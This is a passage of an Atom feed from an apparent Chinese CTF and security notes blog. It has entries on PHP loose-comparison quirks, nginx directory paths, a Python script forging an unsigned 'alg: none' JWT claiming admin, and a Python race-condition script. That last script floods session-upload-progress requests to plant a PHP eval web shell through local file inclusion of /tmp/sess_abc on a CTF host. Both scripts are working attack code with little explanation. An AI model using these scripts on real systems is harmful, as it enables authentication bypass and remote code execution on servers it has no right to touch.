    <content type="html"><![CDATA[<p>PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。<br>例如，“a==0”将会得到true，“a==1”将会得到false。</p><p>原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字0，再进行比较。如果是以数字开头的字符串，那么它将会转化成开头的数字（即第一个字母前的所有数字）。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"787abe"</span><span class="token operator">=</span><span class="token number">787</span>   <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"abc"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"1a2b"</span><span class="token operator">=</span><span class="token number">1</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"a12b"</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token string double-quoted-string">"000123abc"</span><span class="token operator">=</span><span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例外：(int)”1e2”==100，在PHP中若像这种格式的字符串转化成数字，PHP会将其视为科学计数法。<br>(int)”1e2abc”=(int)”1e2”=100<br>(int )”1eabce”=1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP是一门弱类型语言，当涉及“==”判断时，它的表现是有一些奇特的。&lt;br&gt;例如，“a==0”将会得到true，“a==1”将会得到false。&lt;/p&gt;
&lt;p&gt;原理：PHP语言中在涉及“==”判断时，如果运算符两边分别为字符串（不以数字开头的字符串），会将字符串转化为数字</summary>
      
    
    
    
    <category term="code audit" scheme="http://example.com/categories/code-audit/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>web directory</title>
    <link href="http://example.com/basic_web_directory/"/>
    <id>http://example.com/basic_web_directory/</id>
    <published>2023-09-05T01:29:34.687Z</published>
    <updated>2022-04-25T05:12:49.869Z</updated>
    
    <content type="html"><![CDATA[<p><code>nginx</code>网站目录</p><pre class="line-numbers language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;nginx&lt;/code&gt;网站目录&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;配置文件存放目录：&amp;#x2F;etc&amp;#x2F;nginx
主配置文件：&amp;#x2F;</summary>
      
    
    
    
    <category term="another" scheme="http://example.com/categories/another/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>jwt forge</title>
    <link href="http://example.com/forge%20jwt/"/>
    <id>http://example.com/forge%20jwt/</id>
    <published>2022-04-12T16:00:00.000Z</published>
    <updated>2022-04-16T08:50:01.722Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token string">'&#123;"alg":"none","typ":"JWT"&#125;'</span>b<span class="token operator">=</span> <span class="token string">'&#123;"secretid":[],"username":"admin","password":"a","iat":1649828192&#125;'</span>c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; bas</summary>
      
    
    
    
    <category term="authentication" scheme="http://example.com/categories/authentication/"/>
    
    
    <category term="script" scheme="http://example.com/tags/script/"/>
    
  </entry>
  
  <entry>
    <title>race conditions</title>
    <link href="http://example.com/race_conditions_1/"/>
    <id>http://example.com/race_conditions_1/</id>
    <published>2021-11-20T16:00:00.000Z</published>
    <updated>2022-04-16T08:51:46.274Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepur<span class="token operator">=</span><span class="token string">'http://9fe5d7d0-6a86-40a8-b6e3-6a6ed9d00084.node4.buuoj.cn:81/flflflflag.php'</span>dat<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php fputs(fopen('a.php','w'),'&lt;?php eval($_GET[door])?>');?>"</span><span class="token punctuation">&#125;</span>fil<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>cooki<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span><span class="token string">'abc'</span><span class="token punctuation">&#125;</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token string">'/tmp/sess_abc'</span><span class="token punctuation">&#125;</span>ses<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ses<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>data<span class="token operator">=</span>dat<span class="token punctuation">,</span>files<span class="token operator">=</span>fil<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cooki<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>a<span class="token operator">=</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>Upload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    ses<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>ur<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;pre class=&quot;line-numbers language-python&quot; data-language=&quot;python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; req</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="script" scheme="http://example.com/tags/script/"/>
    
  </entry>
  
</feed>
